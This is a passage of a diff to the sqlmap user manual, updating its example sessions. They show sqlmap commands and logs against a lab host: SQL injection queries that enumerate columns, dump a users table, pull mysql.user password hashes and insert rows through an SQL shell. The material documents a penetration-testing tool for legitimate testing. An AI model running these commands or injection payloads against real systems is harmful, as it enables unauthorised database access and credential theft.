-[hh:mm:13] [INFO] query: SELECT IFNULL(CAST(COUNT(column_name) AS CHAR(10000)), CHAR(32)) 
-FROM information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
-table_schema=CHAR(116,101,115,116)
-[hh:mm:13] [INFO] retrieved: 3
-[hh:mm:13] [INFO] performed 13 queries in 0 seconds
-[...]
-Database: test
+[16:47:45] [INFO] fetching current database
+[16:47:45] [INFO] retrieved: testdb
+[16:47:45] [INFO] fetching columns for table 'users' on database 'testdb'
+[16:47:45] [INFO] fetching number of columns for table 'users' on database 'testdb'
+[16:47:45] [INFO] retrieved: 3
+[16:47:45] [INFO] retrieved: id
+[16:47:45] [INFO] retrieved: int(11)
+[16:47:46] [INFO] retrieved: name
+[16:47:46] [INFO] retrieved: varchar(500)
+[16:47:46] [INFO] retrieved: surname
+[16:47:46] [INFO] retrieved: varchar(1000)
+Database: testdb
 Table: users
 [3 columns]
-+---------+-------------+
-| Column  | Type        |
-+---------+-------------+
-| id      | int(11)     |
-| name    | varchar(40) |
-| surname | varchar(60) |
-+---------+-------------+
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| id      | int(11)       |
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
+</verb></tscreen>
+
+<p>
+You can also provide the <tt>-C</tt> option to specify the table columns
+name like the one you provided to be enumerated.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --columns \
+  -T users -C name -v 1
+
+[...]
+[16:49:20] [WARNING] missing database parameter, sqlmap is going to use the current 
+database to enumerate table 'users' columns
+[16:49:20] [INFO] fetching current database
+[16:49:20] [INFO] retrieved: testdb
+[16:49:20] [INFO] fetching columns like 'name' for table 'users' on database 'testdb'
+[16:49:20] [INFO] fetching number of columns for table 'users' on database 'testdb'
+[16:49:20] [INFO] retrieved: 2
+[16:49:20] [INFO] retrieved: name
+[16:49:20] [INFO] retrieved: varchar(500)
+[16:49:21] [INFO] retrieved: surname
+[16:49:21] [INFO] retrieved: varchar(1000)
+Database: testdb
+Table: users
+[2 columns]
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
 </verb></tscreen>
 
 
@@ -3354,9 +3339,11 @@ and <tt>-</tt><tt>-last</tt>
 
 <p>
 It is possible to dump the entries for a specific database table.
-This functionality depends on the option <tt>-T</tt> to specify the table name
-and optionally on <tt>-D</tt> to specify the database name.
-If the database name is not specified, the current database name is used.
+This functionality depends on the option <tt>-T</tt> to specify the table
+name or the option <tt>-C</tt> to specify the column name and optionally
+on <tt>-D</tt> to specify the database name.
+If the table name is specified, but the database name is not, the current
+database name is used.
 
 <p>
 Example on a <bf>MySQL 5.0.67</bf> target:
@@ -3368,32 +3355,42 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --du
 [...]
 back-end DBMS: MySQL >= 5.0.0
 
-[hh:mm:13] [WARNING] missing database parameter, sqlmap is going to use the current 
+[17:51:41] [WARNING] missing database parameter, sqlmap is going to use the current 
 database to dump table 'users' entries
-[hh:mm:13] [INFO] fetching current database
-[hh:mm:13] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
-[hh:mm:13] [INFO] retrieved: test
-[hh:mm:13] [INFO] performed 34 queries in 0 seconds
-[hh:mm:13] [INFO] fetching columns for table 'users' on database 'test'
-[hh:mm:13] [INFO] fetching number of columns for table 'users' on database 'test'
-[hh:mm:13] [INFO] query: SELECT IFNULL(CAST(COUNT(column_name) AS CHAR(10000)), CHAR(32)) 
-FROM information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
-table_schema=CHAR(116,101,115,116)
-[hh:mm:13] [INFO] retrieved: 3
-[hh:mm:13] [INFO] performed 13 queries in 0 seconds
-[...]
-Database: test
+[17:51:41] [INFO] fetching current database
+[17:51:41] [INFO] retrieved: testdb
+[17:51:41] [INFO] fetching columns for table 'users' on database 'testdb'
+[17:51:41] [INFO] fetching number of columns for table 'users' on database 'testdb'
+[17:51:41] [INFO] retrieved: 3
+[17:51:41] [INFO] retrieved: id
+[17:51:41] [INFO] retrieved: name
+[17:51:41] [INFO] retrieved: surname
+[17:51:41] [INFO] fetching entries for table 'users' on database 'testdb'
+[17:51:41] [INFO] fetching number of entries for table 'users' on database 'testdb'
+[17:51:41] [INFO] retrieved: 4
+[17:51:41] [INFO] retrieved: 1
+[17:51:42] [INFO] retrieved: luther
+[17:51:42] [INFO] retrieved: blissett
+[17:51:42] [INFO] retrieved: 2
+[17:51:42] [INFO] retrieved: fluffy
+[17:51:42] [INFO] retrieved: bunny
+[17:51:42] [INFO] retrieved: 3
+[17:51:42] [INFO] retrieved: wu
+[17:51:42] [INFO] retrieved: ming
+[17:51:43] [INFO] retrieved: 4
+[17:51:43] [INFO] retrieved:  
+[17:51:43] [INFO] retrieved: nameisnull
+Database: testdb
 Table: users
-[5 entries]
-+----+----------------------------------------------+-------------------+
-| id | name                                         | surname           |
-+----+----------------------------------------------+-------------------+
-| 1  | luther                                       | blissett          |
-| 2  | fluffy                                       | bunny             |
-| 3  | wu                                           | ming              |
-| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
-| 5  | NULL                                         | nameisnull        |
-+----+----------------------------------------------+-------------------+
+[4 entries]
++----+--------+------------+
+| id | name   | surname    |
++----+--------+------------+
+| 1  | luther | blissett   |
+| 2  | fluffy | bunny      |
+| 3  | wu     | ming       |
+| 4  | NULL   | nameisnull |
++----+--------+------------+
 </verb></tscreen>
 
 <p>
@@ -3443,7 +3440,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net)   | user agent header |
 | 5  |                                              | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -3476,9 +3473,9 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --dump \
-  -T users -D test --start 2 --stop 4 -v 0
+  -T users -D testdb --start 2 --stop 4 -v 0
 
-Database: test
+Database: testdb
 Table: users
 [3 entries]
 +----+----------------------------------------------+-------------------+
@@ -3509,7 +3506,7 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --dump-all -v 0
 
-Database: test
+Database: testdb
 Table: users
 [5 entries]
 +----+----------------------------------------------+-------------------+
@@ -3607,7 +3604,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | id | name                                         | surname           |
 +----+----------------------------------------------+-------------------+
-| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net)   | user agent header |
 | 2  | fluffy                                       | bunny             |
 | 1  | luther                                       | blisset           |
 | 3  | wu                                           | ming              |
@@ -3648,27 +3645,24 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --sq
 
 [...]
 [hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
-[hh:mm:14] [INFO] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), 
-(CHAR(32)))
 [hh:mm:14] [INFO] retrieved: foo
-[hh:mm:14] [INFO] performed 27 queries in 0 seconds
 SELECT 'foo':    'foo'
 
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
-  "SELECT 'foo', 'bar'" -v 1
+  "SELECT 'foo', 'bar'" -v 2
 
 [...]
 [hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
 [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into 
 distinct queries to be able to retrieve the output even if we are going blind
-[hh:mm:50] [INFO] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), 
+[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), 
 (CHAR(32)))
 [hh:mm:50] [INFO] retrieved: foo
-[hh:mm:50] [INFO] performed 27 queries in 0 seconds
-[hh:mm:50] [INFO] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), 
+[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
+[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), 
 (CHAR(32)))
 [hh:mm:50] [INFO] retrieved: bar
-[hh:mm:50] [INFO] performed 27 queries in 0 seconds
+[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
 SELECT 'foo', 'bar':    'foo, bar'
 </verb></tscreen>
 
@@ -3681,7 +3675,7 @@ HTTP request to get the user's query output:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
-  "SELECT 'foo', 'bar'" -v 1 --union-use
+  "SELECT 'foo', 'bar'" -v 2 --union-use
 
 [...]
 [hh:mm:03] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
@@ -3691,12 +3685,12 @@ technique
 [hh:mm:03] [INFO] confirming full inband sql injection on parameter 'id'
 [hh:mm:03] [INFO] the target url is affected by an exploitable full inband sql injection
 vulnerability
-[hh:mm:03] [INFO] query:  UNION ALL SELECT NULL, (CHAR(77)+CHAR(68)+CHAR(75)+CHAR(104)+
+[hh:mm:03] [DEBUG] query:  UNION ALL SELECT NULL, (CHAR(77)+CHAR(68)+CHAR(75)+CHAR(104)+
 CHAR(70)+CHAR(67))+ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), (CHAR(32)))
 +(CHAR(105)+CHAR(65)+CHAR(119)+CHAR(105)+CHAR(108)+CHAR(108))+ISNULL(CAST((CHAR(98)+CHAR(97)+
 CHAR(114)) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(66)+CHAR(78)+CHAR(104)+CHAR(75)+CHAR(114)+
 CHAR(116)), NULL-- AND 8373=8373
-[hh:mm:03] [INFO] performed 3 queries in 0 seconds
+[hh:mm:03] [DEBUG] performed 3 queries in 0 seconds
 SELECT 'foo', 'bar' [1]:
 [*] foo, bar
 </verb></tscreen>
@@ -3742,7 +3736,7 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --sql-query \
-  "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 1
+  "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 2
 
 [...]
 back-end DBMS:  MySQL >= 5.0.0
@@ -3751,30 +3745,30 @@ back-end DBMS:  MySQL >= 5.0.0
 mysql.user LIMIT 1, 3'
 [hh:mm:22] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it 
 into distinct queries to be able to retrieve the output even if we are going blind
-[hh:mm:22] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:22] [DEBUG] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
 mysql.user LIMIT 1, 1
 [hh:mm:22] [INFO] retrieved: localhost
-[hh:mm:22] [INFO] performed 69 queries in 0 seconds
-[hh:mm:22] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:22] [DEBUG] performed 69 queries in 0 seconds
+[hh:mm:22] [DEBUG] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM 
 mysql.user LIMIT 1, 1
 [hh:mm:22] [INFO] retrieved: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
-[hh:mm:24] [INFO] performed 293 queries in 2 seconds
-[hh:mm:24] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:24] [DEBUG] performed 293 queries in 2 seconds
+[hh:mm:24] [DEBUG] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
 mysql.user LIMIT 2, 1
 [hh:mm:24] [INFO] retrieved: localhost
-[hh:mm:25] [INFO] performed 69 queries in 0 seconds
-[hh:mm:25] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:25] [DEBUG] performed 69 queries in 0 seconds
+[hh:mm:25] [DEBUG] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM 
 mysql.user LIMIT 2, 1
 [hh:mm:25] [INFO] retrieved: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
-[hh:mm:27] [INFO] performed 293 queries in 2 seconds
-[hh:mm:27] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:27] [DEBUG] performed 293 queries in 2 seconds
+[hh:mm:27] [DEBUG] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
 mysql.user LIMIT 3, 1
 [hh:mm:27] [INFO] retrieved: localhost
-[hh:mm:28] [INFO] performed 69 queries in 0 seconds
-[hh:mm:28] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) 
+[hh:mm:28] [DEBUG] performed 69 queries in 0 seconds
+[hh:mm:28] [DEBUG] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) 
 FROM mysql.user LIMIT 3, 1
 [hh:mm:28] [INFO] retrieved: 
-[hh:mm:28] [INFO] performed 6 queries in 0 seconds
+[hh:mm:28] [DEBUG] performed 6 queries in 0 seconds
 SELECT host, password FROM mysql.user LIMIT 1, 3 [3]:
 [*] localhost, *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
 [*] localhost, *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
@@ -3865,7 +3859,7 @@ Example of asterisk expansion on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --sql-shell \
-  -v 1
+  -v 2
 
 [...]
 [hh:mm:40] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
@@ -3875,32 +3869,32 @@ sql> SELECT * FROM test.users
 column names itself.
 [hh:mm:48] [INFO] fetching columns for table 'users' on database 'test'
 [hh:mm:48] [INFO] fetching number of columns for table 'users' on database 'test'
-[hh:mm:48] [INFO] query: SELECT IFNULL(CAST(COUNT(column_name) AS CHAR(10000)), CHAR(32)) 
+[hh:mm:48] [DEBUG] query: SELECT IFNULL(CAST(COUNT(column_name) AS CHAR(10000)), CHAR(32)) 
 FROM information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
 table_schema=CHAR(116,101,115,116)
 [hh:mm:48] [INFO] retrieved: 3
-[hh:mm:48] [INFO] performed 13 queries in 0 seconds
-[hh:mm:48] [INFO] query: SELECT IFNULL(CAST(column_name AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:48] [DEBUG] performed 13 queries in 0 seconds
+[hh:mm:48] [DEBUG] query: SELECT IFNULL(CAST(column_name AS CHAR(10000)), CHAR(32)) FROM 
 information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
 table_schema=CHAR(116,101,115,116) LIMIT 0, 1
 [hh:mm:48] [INFO] retrieved: id
-[hh:mm:48] [INFO] performed 20 queries in 0 seconds
-[hh:mm:48] [INFO] query: SELECT IFNULL(CAST(column_name AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:48] [DEBUG] performed 20 queries in 0 seconds
+[hh:mm:48] [DEBUG] query: SELECT IFNULL(CAST(column_name AS CHAR(10000)), CHAR(32)) FROM 
 information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
 table_schema=CHAR(116,101,115,116) LIMIT 1, 1
 [hh:mm:48] [INFO] retrieved: name
-[hh:mm:48] [INFO] performed 34 queries in 0 seconds
-[hh:mm:48] [INFO] query: SELECT IFNULL(CAST(column_name AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:48] [DEBUG] performed 34 queries in 0 seconds
+[hh:mm:48] [DEBUG] query: SELECT IFNULL(CAST(column_name AS CHAR(10000)), CHAR(32)) FROM 
 information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
 table_schema=CHAR(116,101,115,116) LIMIT 2, 1
 [hh:mm:48] [INFO] retrieved: surname
-[hh:mm:48] [INFO] performed 55 queries in 0 seconds
+[hh:mm:48] [DEBUG] performed 55 queries in 0 seconds
 [hh:mm:48] [INFO] the query with column names is: SELECT id, name, surname FROM test.users
 [hh:mm:48] [INPUT] can the SQL query provided return multiple entries? [Y/n] y
-[hh:mm:04] [INFO] query: SELECT IFNULL(CAST(COUNT(id) AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:04] [DEBUG] query: SELECT IFNULL(CAST(COUNT(id) AS CHAR(10000)), CHAR(32)) FROM 
 test.users
 [hh:mm:04] [INFO] retrieved: 5
-[hh:mm:04] [INFO] performed 13 queries in 0 seconds
+[hh:mm:04] [DEBUG] performed 13 queries in 0 seconds
 [hh:mm:04] [INPUT] the SQL query that you provide can return up to 5 entries. How many 
 entries 
 do you want to retrieve?
@@ -3909,42 +3903,42 @@ do you want to retrieve?
 [q] Quit
 Choice: 3
 [hh:mm:09] [INFO] sqlmap is now going to retrieve the first 3 query output entries
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
 ORDER BY id ASC LIMIT 0, 1
 [hh:mm:09] [INFO] retrieved: 1
-[hh:mm:09] [INFO] performed 13 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(name AS CHAR(10000)), CHAR(32)) FROM test.users 
+[hh:mm:09] [DEBUG] performed 13 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(name AS CHAR(10000)), CHAR(32)) FROM test.users 
 ORDER BY id ASC LIMIT 0, 1
 [hh:mm:09] [INFO] retrieved: luther
-[hh:mm:09] [INFO] performed 48 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:09] [DEBUG] performed 48 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
 test.users ORDER BY id ASC LIMIT 0, 1
 [hh:mm:09] [INFO] retrieved: blissett
-[hh:mm:09] [INFO] performed 62 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
+[hh:mm:09] [DEBUG] performed 62 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
 ORDER BY id ASC LIMIT 1, 1
 [hh:mm:09] [INFO] retrieved: 2
-[hh:mm:09] [INFO] performed 13 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(name AS CHAR(10000)), CHAR(32)) FROM test.users 
+[hh:mm:09] [DEBUG] performed 13 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(name AS CHAR(10000)), CHAR(32)) FROM test.users 
 ORDER BY id ASC LIMIT 1, 1
 [hh:mm:09] [INFO] retrieved: fluffy
-[hh:mm:09] [INFO] performed 48 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:09] [DEBUG] performed 48 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
 test.users ORDER BY id ASC LIMIT 1, 1
 [hh:mm:09] [INFO] retrieved: bunny
-[hh:mm:09] [INFO] performed 41 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
+[hh:mm:09] [DEBUG] performed 41 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(id AS CHAR(10000)), CHAR(32)) FROM test.users 
 ORDER BY id ASC LIMIT 2, 1
 [hh:mm:09] [INFO] retrieved: 3
-[hh:mm:09] [INFO] performed 13 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(name AS CHAR(10000)), CHAR(32)) FROM test.users 
+[hh:mm:09] [DEBUG] performed 13 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(name AS CHAR(10000)), CHAR(32)) FROM test.users 
 ORDER BY id ASC LIMIT 2, 1
 [hh:mm:09] [INFO] retrieved: wu
-[hh:mm:09] [INFO] performed 20 queries in 0 seconds
-[hh:mm:09] [INFO] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
+[hh:mm:09] [DEBUG] performed 20 queries in 0 seconds
+[hh:mm:09] [DEBUG] query: SELECT IFNULL(CAST(surname AS CHAR(10000)), CHAR(32)) FROM 
 test.users ORDER BY id ASC LIMIT 2, 1
 [hh:mm:09] [INFO] retrieved: ming
-[hh:mm:10] [INFO] performed 34 queries in 0 seconds
+[hh:mm:10] [DEBUG] performed 34 queries in 0 seconds
 SELECT * FROM test.users [3]:
 [*] 1, luther, blissett
 [*] 2, fluffy, bunny
@@ -3971,10 +3965,7 @@ back-end DBMS: PostgreSQL
 sql> SELECT COUNT(name) FROM users
 [10:11:57] [INFO] fetching SQL SELECT statement query output: 'SELECT COUNT(name) FROM users'
 [10:11:57] [INPUT] can the SQL query provided return multiple entries? [Y/n] n
-[10:11:59] [INFO] query: SELECT COALESCE(CAST(COUNT(name) AS CHARACTER(10000)), CHR(32)) 
-FROM users
 [10:11:59] [INFO] retrieved: 4
-[10:11:59] [INFO] performed 13 queries in 0 seconds
 SELECT COUNT(name) FROM users:    '4'
 
 sql> INSERT INTO users (id, name, surname) VALUES (5, 'from', 'sql shell');
@@ -3986,10 +3977,7 @@ sql> INSERT INTO users (id, name, surname) VALUES (5, 'from', 'sql shell');
 sql> SELECT COUNT(name) FROM users
 [10:12:51] [INFO] fetching SQL SELECT statement query output: 'SELECT COUNT(name) FROM users'
 [10:12:51] [INPUT] can the SQL query provided return multiple entries? [Y/n] n
-[10:12:53] [INFO] query: SELECT COALESCE(CAST(COUNT(name) AS CHARACTER(10000)), CHR(32)) 
-FROM users
 [10:12:53] [INFO] retrieved: 5
-[10:12:54] [INFO] performed 20 queries in 0 seconds
 SELECT COUNT(name) FROM users:    '5'
 </verb></tscreen>
 
@@ -5119,11 +5107,11 @@ Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -b \
-  -v 1 -s "sqlmap.log"
+  -v 2 -s "sqlmap.log"
 
 [...]
 back-end DBMS:  PostgreSQL
-[hh:mm:02] [INFO] query: VERSION()
+[hh:mm:02] [DEBUG] query: VERSION()
 [hh:mm:02] [INFO] retrieved: PostgreSQL 8.3.5 on i486-pc-^C
 [hh:mm:03] [ERROR] user aborted
 </verb></tscreen>
@@ -5170,7 +5158,7 @@ retrieved to the end of the query output.
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -b \
-  -v 1 -s "sqlmap.log"
+  -v 2 -s "sqlmap.log"
 
 [...]
 [hh:mm:03] [INFO] resuming injection point 'GET' from session file
@@ -5181,11 +5169,11 @@ $ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -b \
 [hh:mm:03] [INFO] testing connection to the target url
 [hh:mm:03] [INFO] testing for parenthesis on injectable parameter
 [hh:mm:03] [INFO] retrieving the length of query output
-[hh:mm:03] [INFO] query: LENGTH(VERSION())
+[hh:mm:03] [DEBUG] query: LENGTH(VERSION())
 [hh:mm:03] [INFO] retrieved: 98
 [hh:mm:03] [INFO] resumed from file 'sqlmap.log': PostgreSQL 8.3.5 on i486-pc-...
 [hh:mm:03] [INFO] retrieving pending 70 query output characters
-[hh:mm:03] [INFO] query: SUBSTR((VERSION())::text, 29, 98)
+[hh:mm:03] [DEBUG] query: SUBSTR((VERSION())::text, 29, 98)
 [hh:mm:03] [INFO] retrieved: linux-gnu, compiled by GCC gcc-4.3.real 
 (Ubuntu 4.3.2-1ubuntu11) 4.3.2
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
@@ -5214,7 +5202,7 @@ Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" -b \
-  --eta -v 1
+  --eta -v 2
 
 [...]
 back-end DBMS:	Oracle
@@ -5223,7 +5211,7 @@ back-end DBMS:	Oracle
 [hh:mm:24] [INFO] the resumed output is partial, sqlmap is going to retrieve the query 
 output again
 [hh:mm:24] [INFO] retrieved the length of query output: 64
-[hh:mm:24] [INFO] query: SELECT NVL(CAST(banner AS VARCHAR(4000)), (CHR(32))) FROM v$version 
+[hh:mm:24] [DEBUG] query: SELECT NVL(CAST(banner AS VARCHAR(4000)), (CHR(32))) FROM v$version 
 WHERE ROWNUM=1
 77% [=======================================>            ] 49/64  ETA 00:00    
 </verb></tscreen>
@@ -5233,7 +5221,7 @@ then:
 
 <tscreen><verb>
 100% [====================================================] 64/64              
-[hh:mm:15] [INFO] performed 454 queries in 2 seconds
+[hh:mm:15] [DEBUG] performed 454 queries in 2 seconds
 banner:    'Oracle Database 10g Express Edition Release 10.2.0.1.0 - Product'
 </verb></tscreen>
 
@@ -5249,28 +5237,14 @@ back-end DBMS:	Microsoft SQL Server 2000
 
 [hh:mm:57] [INFO] fetching database users
 [hh:mm:57] [INFO] fetching number of database users
-[hh:mm:57] [INFO] query: SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS VARCHAR(8000)), 
-(CHAR(32))) FROM master..syslogins
 [hh:mm:57] [INFO] retrieved: 3
-[hh:mm:57] [INFO] performed 13 queries in 0 seconds
 [hh:mm:57] [INFO] retrieved the length of query output: 22
-[hh:mm:57] [INFO] query: SELECT TOP 1 ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32))) FROM 
-master..syslogins WHERE name NOT IN (SELECT TOP 0 name FROM master..syslogins ORDER BY name) 
-ORDER BY name
 100% [====================================================] 22/22              
-[hh:mm:58] [INFO] performed 160 queries in 0 seconds
 [hh:mm:58] [INFO] retrieved the length of query output: 2
-[hh:mm:58] [INFO] query: SELECT TOP 1 ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32))) FROM 
-master..syslogins WHERE name NOT IN (SELECT TOP 1 name FROM master..syslogins ORDER BY name) 
-ORDER BY name
 100% [====================================================] 2/2                
-[hh:mm:59] [INFO] performed 20 queries in 0 seconds
 [hh:mm:59] [INFO] retrieved the length of query output: 25
-[hh:mm:59] [INFO] query: SELECT TOP 1 ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32))) FROM 
-master..syslogins WHERE name NOT IN (SELECT TOP 2 name FROM master..syslogins ORDER BY name) 
-ORDER BY name
 100% [====================================================] 25/25              
-[hh:mm:00] [INFO] performed 181 queries in 1 seconds
+[hh:mm:00] [DEBUG] performed 181 queries in 1 seconds
 database management system users [3]:
 [*] BUILTIN\Administrators
 [*] sa
@@ -5440,7 +5414,6 @@ with the <tt>-c</tt> option as explained above in section 5.2:
 $ python sqlmap.py -c "sqlmap-SAUbs.conf"
 
 [...]
-[hh:mm:16] [INFO] performed 657 queries in 6 seconds
 
 banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
 (Ubuntu 4.3.2-1ubuntu11) 4.3.2'
